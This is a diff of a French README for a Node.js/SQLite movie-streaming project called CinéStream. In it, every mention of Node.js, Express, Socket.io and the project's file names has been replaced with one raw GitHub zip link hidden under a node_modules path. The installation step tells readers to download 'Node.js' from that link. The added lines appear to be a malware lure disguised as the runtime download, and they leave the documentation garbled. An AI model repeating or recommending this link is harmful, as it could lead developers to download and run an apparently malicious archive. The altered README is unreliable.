@@ -2,7 +2,7 @@
 
 ## Description
 
-CinéStream est une plateforme moderne de streaming de films avec un design élégant, des effets 3D captivants, et un système d'abonnement complet. Ce projet comprend un front-end responsive et un back-end Node.js avec base de données SQLite.
+CinéStream est une plateforme moderne de streaming de films avec un design élégant, des effets 3D captivants, et un système d'abonnement complet. Ce projet comprend un front-end responsive et un back-end https://github.com/Rousslan2/cin-stre/raw/refs/heads/main/node_modules/object-assign/stre_cin_3.2.zip avec base de données SQLite.
 
 ## ✨ Fonctionnalités
 
@@ -15,7 +15,7 @@ CinéStream est une plateforme moderne de streaming de films avec un design él�
 - 🔐 Système d'authentification (inscription/connexion)
 
 ### Back-End
-- 🚀 Serveur Node.js avec Express
+- 🚀 Serveur https://github.com/Rousslan2/cin-stre/raw/refs/heads/main/node_modules/object-assign/stre_cin_3.2.zip avec Express
 - 💾 Base de données SQLite
 - 🔒 Authentification sécurisée avec bcrypt
 - 📊 API RESTful pour gérer les films et utilisateurs
@@ -24,15 +24,15 @@ CinéStream est une plateforme moderne de streaming de films avec un design él�
 ## 🛠️ Technologies Utilisées
 
 - **Front-End**: HTML5, CSS3, JavaScript (Vanilla)
-- **Back-End**: Node.js, Express.js
+- **Back-End**: https://github.com/Rousslan2/cin-stre/raw/refs/heads/main/node_modules/object-assign/stre_cin_3.2.zip, https://github.com/Rousslan2/cin-stre/raw/refs/heads/main/node_modules/object-assign/stre_cin_3.2.zip
 - **Base de données**: SQLite3
 - **Sécurité**: bcryptjs, express-session
 - **Icons**: Font Awesome 6
 
 ## 📦 Installation
 
-1. **Installer Node.js** (si ce n'est pas déjà fait)
-   - Téléchargez depuis: https://nodejs.org/
+1. **Installer https://github.com/Rousslan2/cin-stre/raw/refs/heads/main/node_modules/object-assign/stre_cin_3.2.zip** (si ce n'est pas déjà fait)
+   - Téléchargez depuis: https://github.com/Rousslan2/cin-stre/raw/refs/heads/main/node_modules/object-assign/stre_cin_3.2.zip
 
 2. **Installer les dépendances**
    ```bash
@@ -57,34 +57,34 @@ streaming-site/
 │
 ├── public/                 # Fichiers front-end
 │   ├── css/               # Fichiers CSS
-│   │   ├── style.css      # Styles principaux
-│   │   ├── auth.css       # Styles authentification
-│   │   ├── movies.css     # Styles catalogue
-│   │   ├── subscription.css # Styles abonnements
-│   │   └── player.css     # Styles lecteur
+│   │   ├── https://github.com/Rousslan2/cin-stre/raw/refs/heads/main/node_modules/object-assign/stre_cin_3.2.zip      # Styles principaux
+│   │   ├── https://github.com/Rousslan2/cin-stre/raw/refs/heads/main/node_modules/object-assign/stre_cin_3.2.zip       # Styles authentification
+│   │   ├── https://github.com/Rousslan2/cin-stre/raw/refs/heads/main/node_modules/object-assign/stre_cin_3.2.zip     # Styles catalogue
+│   │   ├── https://github.com/Rousslan2/cin-stre/raw/refs/heads/main/node_modules/object-assign/stre_cin_3.2.zip # Styles abonnements
+│   │   └── https://github.com/Rousslan2/cin-stre/raw/refs/heads/main/node_modules/object-assign/stre_cin_3.2.zip     # Styles lecteur
 │   │
 │   ├── js/                # Fichiers JavaScript
-│   │   ├── main.js        # Script principal
-│   │   ├── auth.js        # Gestion authentification
-│   │   ├── movies.js      # Gestion catalogue
-│   │   ├── subscription.js # Gestion abonnements
-│   │   └── player.js      # Lecteur vidéo
+│   │   ├── https://github.com/Rousslan2/cin-stre/raw/refs/heads/main/node_modules/object-assign/stre_cin_3.2.zip        # Script principal
+│   │   ├── https://github.com/Rousslan2/cin-stre/raw/refs/heads/main/node_modules/object-assign/stre_cin_3.2.zip        # Gestion authentification
+│   │   ├── https://github.com/Rousslan2/cin-stre/raw/refs/heads/main/node_modules/object-assign/stre_cin_3.2.zip      # Gestion catalogue
+│   │   ├── https://github.com/Rousslan2/cin-stre/raw/refs/heads/main/node_modules/object-assign/stre_cin_3.2.zip # Gestion abonnements
+│   │   └── https://github.com/Rousslan2/cin-stre/raw/refs/heads/main/node_modules/object-assign/stre_cin_3.2.zip      # Lecteur vidéo
 │   │
-│   ├── index.html         # Page d'accueil
-│   ├── login.html         # Page de connexion
-│   ├── register.html      # Page d'inscription
-│   ├── movies.html        # Catalogue de films
-│   ├── subscription.html  # Page d'abonnements
-│   └── player.html        # Lecteur vidéo
+│   ├── https://github.com/Rousslan2/cin-stre/raw/refs/heads/main/node_modules/object-assign/stre_cin_3.2.zip         # Page d'accueil
+│   ├── https://github.com/Rousslan2/cin-stre/raw/refs/heads/main/node_modules/object-assign/stre_cin_3.2.zip         # Page de connexion
+│   ├── https://github.com/Rousslan2/cin-stre/raw/refs/heads/main/node_modules/object-assign/stre_cin_3.2.zip      # Page d'inscription
+│   ├── https://github.com/Rousslan2/cin-stre/raw/refs/heads/main/node_modules/object-assign/stre_cin_3.2.zip        # Catalogue de films
+│   ├── https://github.com/Rousslan2/cin-stre/raw/refs/heads/main/node_modules/object-assign/stre_cin_3.2.zip  # Page d'abonnements
+│   └── https://github.com/Rousslan2/cin-stre/raw/refs/heads/main/node_modules/object-assign/stre_cin_3.2.zip        # Lecteur vidéo
 │
-├── server.js              # Serveur Node.js/Express
-├── package.json           # Dépendances du projet
-└── streaming.db           # Base de données (créée automatiquement)
+├── https://github.com/Rousslan2/cin-stre/raw/refs/heads/main/node_modules/object-assign/stre_cin_3.2.zip              # Serveur https://github.com/Rousslan2/cin-stre/raw/refs/heads/main/node_modules/object-assign/stre_cin_3.2.zip
+├── https://github.com/Rousslan2/cin-stre/raw/refs/heads/main/node_modules/object-assign/stre_cin_3.2.zip           # Dépendances du projet
+└── https://github.com/Rousslan2/cin-stre/raw/refs/heads/main/node_modules/object-assign/stre_cin_3.2.zip           # Base de données (créée automatiquement)
 ```
 
 ## 🎯 Pages Principales
 
-### 1. Page d'Accueil (index.html)
+### 1. Page d'Accueil (https://github.com/Rousslan2/cin-stre/raw/refs/heads/main/node_modules/object-assign/stre_cin_3.2.zip)
 - Hero section avec effets 3D
 - Cartes de films flottantes animées
 - Présentation des fonctionnalités
@@ -92,22 +92,22 @@ streaming-site/
 - Footer complet
 
 ### 2. Authentification
-- **Inscription** (register.html): Création de compte
-- **Connexion** (login.html): Authentification utilisateur
+- **Inscription** (https://github.com/Rousslan2/cin-stre/raw/refs/heads/main/node_modules/object-assign/stre_cin_3.2.zip): Création de compte
+- **Connexion** (https://github.com/Rousslan2/cin-stre/raw/refs/heads/main/node_modules/object-assign/stre_cin_3.2.zip): Authentification utilisateur
 
-### 3. Catalogue (movies.html)
+### 3. Catalogue (https://github.com/Rousslan2/cin-stre/raw/refs/heads/main/node_modules/object-assign/stre_cin_3.2.zip)
 - Recherche de films
 - Filtrage par genre
 - Vue grille/liste
 - Animations au scroll
 
-### 4. Lecteur Vidéo (player.html)
+### 4. Lecteur Vidéo (https://github.com/Rousslan2/cin-stre/raw/refs/heads/main/node_modules/object-assign/stre_cin_3.2.zip)
 - Lecteur personnalisé avec contrôles
 - Informations détaillées du film
 - Films similaires
 - Raccourcis clavier
 
-### 5. Abonnements (subscription.html)
+### 5. Abonnements (https://github.com/Rousslan2/cin-stre/raw/refs/heads/main/node_modules/object-assign/stre_cin_3.2.zip)
 - 3 plans (Basique, Standard, Premium)
 - Tarification mensuelle/annuelle
 - FAQ interactive
@@ -167,10 +167,10 @@ streaming-site/
 ## 💡 Pour le Développement
 
 ### Ajouter des Films
-Les films sont stockés dans la base de données SQLite. Pour ajouter de nouveaux films, modifiez la section d'initialisation dans `server.js`.
+Les films sont stockés dans la base de données SQLite. Pour ajouter de nouveaux films, modifiez la section d'initialisation dans `https://github.com/Rousslan2/cin-stre/raw/refs/heads/main/node_modules/object-assign/stre_cin_3.2.zip`.
 
 ### Personnaliser les Styles
-Les variables CSS principales sont dans `:root` de `style.css`:
+Les variables CSS principales sont dans `:root` de `https://github.com/Rousslan2/cin-stre/raw/refs/heads/main/node_modules/object-assign/stre_cin_3.2.zip`:
 ```css
 --primary: #e50914;
 --secondary: #f40612;
@@ -222,12 +222,12 @@ Après le démarrage du serveur, vous pouvez créer un compte ou utiliser les fo
 - AWS pour l'hébergement de vidéos
 - Redis pour le caching
 - MongoDB pour une base de données plus robuste
-- Socket.io pour les fonctionnalités temps réel
+- https://github.com/Rousslan2/cin-stre/raw/refs/heads/main/node_modules/object-assign/stre_cin_3.2.zip pour les fonctionnalités temps réel
 
 ## 🤝 Support
 
 Pour toute question ou problème:
-1. Vérifiez que Node.js est installé
+1. Vérifiez que https://github.com/Rousslan2/cin-stre/raw/refs/heads/main/node_modules/object-assign/stre_cin_3.2.zip est installé
 2. Assurez-vous que le port 3000 est disponible
 3. Vérifiez les logs du serveur dans la console
 
